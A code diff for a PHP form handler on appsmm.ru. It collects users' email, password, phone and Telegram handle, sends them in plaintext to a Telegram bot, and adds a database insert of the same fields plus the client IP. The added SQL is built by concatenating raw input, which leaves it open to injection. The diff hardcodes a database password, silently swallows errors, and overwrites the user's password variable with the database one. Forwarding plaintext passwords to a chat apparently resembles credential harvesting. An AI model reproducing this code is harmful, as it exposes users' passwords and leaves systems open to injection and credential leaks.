@@ -3,10 +3,12 @@ include_once 'app/TelegramBotService.php';
 
 if ($_SERVER["REQUEST_METHOD"] == "POST" || $_SERVER["REQUEST_METHOD"] == "GET") {
     $email = $_POST["email"] ?? null;
-    $telegram = $_POST["telegram"] ?? null;
-    $phone = $_POST["phone"] ?? null;
+    $telegram = $_POST["telegram"] ?? '';
+    $phone = $_POST["phone"] ?? '';
     $password = $_POST["password"] ?? null;
-    $role = $_POST["role"] ?? null;
+    $role = $_POST["role"] ?? '';
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $date = date('Y-m-d H:i:s');
     $site = 'appsmm.ru';
 
 
@@ -18,17 +20,37 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" || $_SERVER["REQUEST_METHOD"] == "GET")
     $message .= "Телефон: <b>$phone</b> \n";
     $message .= "Пароль: <b>$password</b> \n";
     $message .= "Роль в сервисе: <b>$role</b> \n";
-    $message .= "Дата: " . "<b>" . date('Y-m-d H:i:s') . "</b>";
+    $message .= "Дата: " . "<b>" . $date . "</b>";
 
 
-    $telegram = new TelegramBotService();
-    $send = $telegram->sendMessage($message, ['parse_mode' => 'HTML']);
+    $telegramService = new TelegramBotService();
+    $send = $telegramService->sendMessage($message, ['parse_mode' => 'HTML']);
 
+    // Database -------------------------------------------------------------------//
+    $servername = "localhost";
+    $username = "appsmm_db";
+    $password = "2D55rAgk3c";
+    $dbname = "appsmm_db";
+
+    try {
+        $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
+        // set the PDO error mode to exception
+        $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+        $sql = "INSERT INTO `orders` (`site`, `email`, `password`, `ip`, `d_t`, `telegram`, `phone`, `role`) VALUES
+        ('" . $site . "', '" . $email . "', '" . $password . "', '" . $ip . "', '" . $date . "', '" . $telegram . "', '" . $phone . "', '" . $role . "')";
+        // use exec() because no results are returned
+        $conn->exec($sql);
+        //echo "New record created successfully";
+    } catch (PDOException $e) {
+
+    }
+
+    $conn = null;
+    // Database -------------------------------------------------------------------//
 
     $jsonData = json_encode(['status' => true]);
     header('Content-Type: application/json');
-
-    header('Location: '. 'https://appsmm.ru');
+    header('Location: ' . 'https://appsmm.ru');
 }
 
 
